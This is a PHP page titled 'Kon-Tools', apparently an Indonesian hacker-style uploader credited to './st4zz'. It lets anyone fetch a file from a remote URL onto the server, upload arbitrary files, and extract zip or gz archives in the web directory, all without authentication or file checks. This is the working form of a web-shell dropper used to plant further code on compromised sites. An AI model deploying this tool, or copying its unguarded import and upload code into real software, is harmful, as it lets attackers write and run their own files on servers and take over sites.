<!DOCTYPE html>
  <head>
  <title>...::: Kon-Tools :::...</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="shortcut icon" href="http://kabaneri.com/favicon.ico" type="img/x-icon"/>
  <link rel="icon" href="http://kabaneri.com/favicon.ico" type="image/x-icon"/>
  <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Ubuntu">
<style>
    @import url(https://fonts.googleapis.com/css?family=Ubuntu:400,700);

    body {
      font-family: Ubuntu, serif;
      max-width: 10000px;
      border: 1px solid #000;
      text-align: center;
    }

    fieldset {
      border: 1px solid #009900;border-radius:8px;width:60%;
    }

    .select {
      padding: 5px;
      font-size: 110%;
    }

    .status {
      margin-top: 20px;
      padding: 5px;
      font-size: 80%;
      width:60%;
      background: #EEE;
      border: 1px dotted #009900;
    }

    form [type=text]{background:#fff;color:#009900;border:2px solid #eee;border-radius:8px;width:60%;padding:7px;margin:2px 2px 0px 2px;
    }

    .submit {
      -moz-box-shadow: inset 0px 1px 0px 0px #009900;
      -webkit-box-shadow: inset 0px 1px 0px 0px #009900;
      box-shadow: inset 0px 1px 0px 0px #009900;
      background: -webkit-gradient(linear, left top, left bottom, color-stop(0.05, #009900), color-stop(1, #009900));
      background: -moz-linear-gradient(center top, #009900 5%, #009900 100%);
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#009900', endColorstr='#009900');
      background-color: #009900;
      -moz-border-radius: 4px;
      -webkit-border-radius: 4px;
      border-radius: 4px;
      border: 1px solid #000;
      display: inline-block;
      color: #ffffff;
      font-family: arial;
      font-size: 15px;
      font-weight: bold;
      padding: 10px 24px;
      text-decoration: none;
      text-shadow: 1px 1px 0px #000;
    }

    .submit:hover {
      background: -webkit-gradient(linear, left top, left bottom, color-stop(0.05, #000), color-stop(1, #000));
      background: -moz-linear-gradient(center top, #000 5%, #000 100%);
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#000', endColorstr='#000');
      background-color: #000;
    }

    .submit:active {
      position: relative;
      top: 1px;
    }
  </style>
</head>
<body>
<?php
if($_POST['act'] == 'Import File' &&$_POST['url'] != '')
{$url=$_POST['url']; $nama=$_POST['nama'];
//Jika nama file tidak diisi, maka nama filenya akan sama dengan nama file yang kita import.
if($nama == '')
{$file=basename($url);}
//Kalo kita masukkan nama filenya, maka nama filenya akan berubah sesuai dengan nama yg kita masukkan.
else{$file=$nama;}
//File berhasil di import.
if(copy($url,$file))
{echo '<center><font color="#009900">File berhasil diimport dan disimpan sebagai</font> “<u><a title="Visit Link" href="./'.$file;
{echo '"><b>'.$file;
{echo '</b></a></u>”</center>';}}}
//File gagal di import.
else {echo '<center><font color="#ff0000">Gagal mengimport file</font> <b>'.basename($url).'';} echo '</b></center><hr />';}
echo '<h1 align="center"><<- Import File ->></h1>';
echo '<center><form method="post">Masukan URL File<br/>
<input type="text" name="url"><br/>
Disimpan sebagai :<br/>
<input type="text" name="nama"><br/><br/>
<input type="submit" name="act" value="Import File" class="submit"></form></center>';
?>
<hr/>
<?php
echo '<h1 align="center"><<- Upload File ->></h1>';
echo '<center><form method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="60"><input name="_upl" type="submit" id="_upl" value="Upload File" class="submit"></form></center>';
if( $_POST['_upl'] == "Upload File" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center>Status: <font color="#009900">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</font></center><br/><br/>'; }
else { echo '<center>Status: <font color="#FF0000">File gagal diupload...!!!</font></center><br/><br/>'; }
}
?>
<hr/>
<?php
/**
 * The Unzipper extracts .zip archives and .gz files by st4zz
  */

$timestart = microtime(TRUE);

$arc = new Unzipper;

$timeend = microtime(TRUE);
$time = $timeend - $timestart;

class Unzipper {
  public $localdir = '.';
  public $zipfiles = array();
  public static $status = '';

  public function __construct() {

    //read directory and pick .zip and .gz files
    if ($dh = opendir($this->localdir)) {
      while (($file = readdir($dh)) !== FALSE) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'
          || pathinfo($file, PATHINFO_EXTENSION) === 'gz'
        ) {
          $this->zipfiles[] = $file;
        }
      }
      closedir($dh);

      if(!empty($this->zipfiles)) {
        self::$status = '<b><span style="color:green;">File ZIP atau GZ berhasil ditemukan!</span></b>';
      }
      else {
        self::$status = '<b><span style="color:red;">Tidak dapat menemukan file ZIP atau GZ!</span></b>';
      }
    }

    //check if an archive was selected for unzipping
    //check if archive has been selected
    $input = '';
    $input = strip_tags($_POST['zipfile']);

    //allow only local existing archives to extract
    if ($input !== '') {
      if (in_array($input, $this->zipfiles)) {
        self::extract($input, $this->localdir);
      }
    }
  }

  public static function extract($archive, $destination) {
    $ext = pathinfo($archive, PATHINFO_EXTENSION);

    if ($ext === 'zip') {
      self::extractZipArchive($archive, $destination);
    }
    else {
      if ($ext === 'gz') {
        self::extractGzipFile($archive, $destination);
      }
    }

  }

  /**
   * Decompress/extract a zip archive using ZipArchive.
   *
   * @param $archive
   * @param $destination
   */
  public static function extractZipArchive($archive, $destination) {
    // Check if webserver supports unzipping.
    if(!class_exists('ZipArchive')) {
      self::$status = '<span style="color:red;">Your PHP version does not support unzip functionality.</span>';
      return;
    }

    $zip = new ZipArchive;

    // Check if archive is readable.
    if ($zip->open($archive) === TRUE) {
      // Check if destination is writable
      if(is_writeable($destination . '/')) {
        $zip->extractTo($destination);
        $zip->close();
        self::$status = '<span style="color:green;"><b>File berhasil di ekstrak :)</b></span>';
      }
      else {
        self::$status = '<span style="color:red;">Directory not writeable by webserver.</span>';
      }
    }
    else {
      self::$status = '<span style="color:red;">Tidak dapat membaca file ZIP atau GZ</span>';
    }
  }

  /**
   * Decompress a .gz File.
   *
   * @param $archive
   * @param $destination
   */
  public static function extractGzipFile($archive, $destination) {
    // Check if zlib is enabled
    if(!function_exists('gzopen')) {
      self::$status = '<span style="color:red;">Your PHP has no zlib support enabled.</span>';
      return;
    }

    $filename = pathinfo($archive, PATHINFO_FILENAME);
    $gzipped = gzopen($archive, "rb");
    $file = fopen($filename, "w");

    while ($string = gzread($gzipped, 4096)) {
      fwrite($file, $string, strlen($string));
    }
    gzclose($gzipped);
    fclose($file);

    // Check if file was extracted.
    if(file_exists($destination . '/' . $filename)) {
      self::$status = '<span style="color:green;"><b>File berhasil di ekstrak :)</b></span>';
    }
    else {
      self::$status = '<span style="color:red;"><b>Error mengekstrak file</b></span>';
    }

  }
}

?>
<h1 align="center"><<- UnZip File ->></h1>
<center><div class="status">
  <b>Status:</b> <?php echo $arc::$status; ?>
</div>
<form action="" method="POST">
  <fieldset>

    <select name="zipfile" size="1" class="select">
      <?php foreach ($arc->zipfiles as $zip) {
        echo "<option>$zip</option>";
      }
      ?>
    </select>

    <br/>

    <input type="submit" name="submit" class="submit" value="UnZip File"/>

  </fieldset>
</form></center>
<hr/>
<table width="100%"><tr><td style="text-align:left;"><a href="." title="Back to directory">« Back to Directory</a></td><td style="text-align:right;">Script coded by <a title="st4zz Blog" href="http://blog.st4zz.io" target="_blank">./st4zz</a></td></tr></table>
</body>
</html>
